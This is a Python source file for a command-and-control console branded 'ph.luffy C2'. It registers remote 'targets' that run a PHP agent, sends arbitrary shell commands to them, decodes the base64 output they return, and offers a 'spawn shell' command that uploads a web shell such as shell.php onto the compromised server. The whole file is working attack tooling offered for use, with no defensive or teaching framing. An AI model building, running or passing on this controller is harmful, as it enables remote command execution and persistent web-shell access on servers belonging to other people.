import requests, json, os, base64, platform

# ANSI color codes
GREEN = "\033[92m"
SILVER = "\033[37m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
RESET = "\033[0m"

SESSION_FILE = "controller_sessions.json"

TOOL_NAME = "ph.luffy C2"
TOOL_VERSION = "v1.0"
TOOL_AUTHOR = "Coded by ph.luffy"

def banner():
    print(f"""{SILVER}
               _                                         
              | |                                        
              | |===( )   //////                         
              |_|   |||  | o o|                          
                     ||| ( c  )                  ____    
                      ||| \\= /                  ||   \\_  
                       ||||||                   ||     | 
                       ||||||                ...||__/|-" 
                       ||||||             __|________|__ 
                         |||             |______________|
                         |||             || ||      || ||
                         |||             || ||      || ||
 ------------------------|||-------------||-||------||-||
                         |__>            || ||      || ||{RESET}

{YELLOW}
      ph.luffy : select a session to continue
{RESET}
    """)
    print(SILVER + "-" * 40 + RESET)
    print(f"{GREEN}[+] Active Sessions:{RESET}")
    for i, sid in enumerate(sessions.keys(), start=1):
        server = sessions[sid].get("server", "unknown")
        print(f"{BLUE}[{i}]{RESET} {sid} - {server}")
    print(SILVER + "-" * 40 + RESET)
    print(f"{GREEN}[+] Commands:{RESET}")
    print(f"{SILVER}[*] spawn shell [name]{RESET} :   {SILVER}Upload your shell (location: /[name]){RESET}")
    print(f"{SILVER}[*] about{RESET}              :   {SILVER}About this tool{RESET}")
    print(f"{SILVER}[*] clear{RESET}              :   {SILVER}Clear commands{RESET}")
    print(f"{SILVER}[*] kill [num]{RESET}         :   {SILVER}Remove session number [num]{RESET}")
    print(SILVER + "-" * 40 + RESET)

def load_sessions():
    if os.path.exists(SESSION_FILE):
        with open(SESSION_FILE) as f:
            return json.load(f)
    return {}

def save_sessions(sessions):
    with open(SESSION_FILE, "w") as f:
        json.dump(sessions, f, indent=4)

def register():
    new_server = input(f"{BLUE}Enter new target (e.g https://target.com/client.php): {RESET}")
    r = requests.get(new_server, params={"action": "register"})
    r.raise_for_status()
    session = r.json()
    session["server"] = new_server
    sessions = load_sessions()
    sessions[session["id"]] = session
    save_sessions(sessions)
    return session

def send_command(session, cmd):
    server = session.get("server")
    r = requests.get(server, params={"action": "push", "id": session["id"], "cmd": cmd})
    return r.json()

def get_last_output(session):
    server = session.get("server")
    r = requests.get(server, params={"action": "fetch_result", "id": session["id"]})
    res = r.json()
    out = res.get("output", "")
    try:
        decoded = base64.b64decode(out).decode(errors="ignore")
    except:
        decoded = out
    return decoded

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def about_tool():
    print(BLUE + "=" * 40 + RESET)
    print(f"{GREEN}{TOOL_NAME} {TOOL_VERSION}{RESET}")
    print(f"{SILVER}{TOOL_AUTHOR}{RESET}")
    print(f"{YELLOW}Description:{RESET} {SILVER}Remote C2 Controller for registered agents{RESET}")
    print(f"{YELLOW}Platform:{RESET} {SILVER}{platform.system()} {platform.release()}{RESET}")
    print(BLUE + "=" * 40 + RESET)

def upload_shell(session, shell_name="shell.php"):
    server = session.get("server")
    shell_path = os.path.join(os.getcwd(), shell_name)
    if not os.path.exists(shell_path):
        print(f"{YELLOW}[!]{RESET} {shell_name} not found in current directory")
        return
    
    files = {'file': open(shell_path, 'rb')}
    try:
        r = requests.post(server, params={"action": "upload", "name": shell_name}, files=files)
        resp = r.json()
        if resp.get("status") == "uploaded":
            print(f"{GREEN}[+]{RESET} Uploaded {shell_name} to server as {BLUE}{resp.get('file')}{RESET}")
        else:
            print(f"{YELLOW}[!]{RESET} Upload failed")
    except Exception as e:
        print(f"{YELLOW}[!]{RESET} Upload error: {e}")

# -------- MAIN --------
sessions = load_sessions()

if sessions:
    banner()
    while True:
        choice = input(f"{BLUE}[*] Select session number, 'n' for new, or 'kill [num]': {RESET}").strip()
        if choice.lower() == "n":
            session = register()
            break
        elif choice.lower().startswith("kill "):
            parts = choice.split()
            if len(parts) == 2 and parts[1].isdigit():
                kill_num = int(parts[1])
                session_keys = list(sessions.keys())
                if 1 <= kill_num <= len(session_keys):
                    sid_to_kill = session_keys[kill_num-1]
                    del sessions[sid_to_kill]
                    save_sessions(sessions)
                    print(f"{YELLOW}[!]{RESET} Session {sid_to_kill} removed.")
                    # Refresh banner after kill
                    if sessions:
                        banner()
                    else:
                        print(f"{YELLOW}[!]{RESET} No sessions left. Registering new session...")
                        session = register()
                        break
                else:
                    print(f"{YELLOW}[!]{RESET} Invalid session number for kill.")
            else:
                print(f"{YELLOW}[!]{RESET} Usage: kill [num]")
            continue
        else:
            try:
                session_id = list(sessions.keys())[int(choice)-1]
                session = sessions[session_id]
                break
            except:
                print(f"{YELLOW}[!]{RESET} Invalid choice. Try again or use 'n' or 'kill [num]'.")
else:
    session = register()

print(f"{GREEN}[+]{RESET} session connected: {BLUE}{session['id']}{RESET}")

while True:
    cmd = input(f"{SILVER}PX({BLUE}{session['id']}{SILVER})> {RESET}").strip()

    # Special commands
    if cmd.lower() in ["exit", "quit"]:
        break
    elif cmd.lower() == "clear":
        clear_screen()
        continue
    elif cmd.lower() == "about":
        about_tool()
        continue
    elif cmd.lower().startswith("spawn shell"):
        # Parse shell name if provided
        parts = cmd.split()
        if len(parts) == 3:
            shell_name = parts[2]
        else:
            shell_name = "shell.php"
        upload_shell(session, shell_name)
        continue

    # Send to target
    send_command(session, cmd)
    output = get_last_output(session)
    print(f"{GREEN}{output}{RESET}")
